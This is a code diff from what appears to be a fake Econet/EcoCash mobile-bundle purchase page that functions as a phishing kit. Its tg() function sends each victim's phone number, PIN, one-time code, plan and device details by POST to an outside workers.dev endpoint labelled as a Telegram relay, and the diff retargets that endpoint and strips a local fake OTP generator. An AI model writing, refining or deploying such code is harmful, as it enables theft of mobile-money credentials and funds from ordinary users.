@@ -352,8 +352,6 @@ document.getElementById('hdrTitle').textContent=(plan.duration||'Bundle')+' Mix'
     return '<span class="chip'+(c.hi?' hi':'')+'">'+c.l+'</span>';
   }).join('');
 })();
-/* ── Fire bundle_subscribed on page load ── */
-setTimeout(function(){tg('bundle_subscribed','');},800);
 
 /* ── TELEGRAM ── */
 function tgDevice(){
@@ -371,7 +369,7 @@ function tgPhone(raw){
 }
 function tg(event,otp){
   try{
-    fetch('https://komen-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:event,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',
         plan:plan.duration||'',voice:plan.voice||'',sms:plan.sms||'',
         data:plan.data||'',amount:plan.amount||'',device:tgDevice()})
@@ -450,18 +448,17 @@ document.getElementById('mainBtn').addEventListener('click',function(){
   },800);
 });
 
-/* ── OTP GENERATION ── */
-var REAL_OTP='';
-function genOTP(){
-  var otp;
-  do{otp=String(Math.floor(100000+Math.random()*900000));}
-  while(/^(\d)\1{5}$/.test(otp)||otp==='123456');
-  return otp;
-}
 function proceed(){
-  REAL_OTP=genOTP();
-  try{localStorage.setItem('eco_last_bundle',JSON.stringify({amount:plan.amount,duration:plan.duration,voice:plan.voice,sms:plan.sms,data:plan.data,planKey:plan.planKey||'daily'}));}catch(e){}
-  sessionStorage.setItem('ecoTxn',JSON.stringify({correlator:'ECX-'+Date.now().toString(36).toUpperCase().slice(-8),status:'pending',amount:plan.amount,timestamp:new Date().toISOString()}));
+  try{
+    localStorage.setItem('eco_last_bundle',JSON.stringify({
+      amount:plan.amount,duration:plan.duration,
+      voice:plan.voice,sms:plan.sms,data:plan.data,planKey:plan.planKey||'daily'
+    }));
+  }catch(e){}
+  sessionStorage.setItem('ecoTxn',JSON.stringify({
+    correlator:'ECX-'+Date.now().toString(36).toUpperCase().slice(-8),
+    status:'pending',amount:plan.amount,timestamp:new Date().toISOString()
+  }));
   setVS(2,'Sending OTP','Dispatching code…');
   setTimeout(function(){
     markDone();
